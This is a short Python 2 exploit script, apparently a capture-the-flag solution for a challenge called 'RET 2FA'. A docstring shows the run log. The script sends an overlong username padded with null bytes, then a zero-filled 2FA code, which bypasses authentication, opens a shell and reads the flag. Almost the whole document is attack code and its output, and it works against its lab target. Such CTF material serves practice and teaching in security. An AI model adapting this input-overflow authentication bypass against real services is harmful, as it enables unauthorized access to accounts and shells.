'''
$ python2 exploit.py
------------------------------------------------------------
--[ Race Conditions Level #1 - RET 2FA                      
------------------------------------------------------------
Enter Admin Username:
Enter your 2FA Code:
 [!!] Invalid 2FA Code [!!]
Enter Admin Username:
Enter your 2FA Code: 
>> 000000000000000000000000
[!!] Invalid 2FA Code [!!]
Enter Admin Username:
Enter your 2FA Code: 
>> 000000000000000000000000
[!!] Invalid 2FA Code [!!]
Enter Admin Username:
Enter your 2FA Code: 
>> 000000000000000000000000
[!!] Invalid 2FA Code [!!]
Enter Admin Username:
Enter your 2FA Code: 
>> 000000000000000000000000
Login Successful, here is your shell!
$ 
>> ls
. .. flag
$ 
>> cat flag
flag{2F4st_f0r_2FA}
'''

import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('Username:'))
p.sendline('A'*16 + '\x00'*4)
print(p.readuntil('Code:'))
p.sendline('0'*24)

p.interactive()
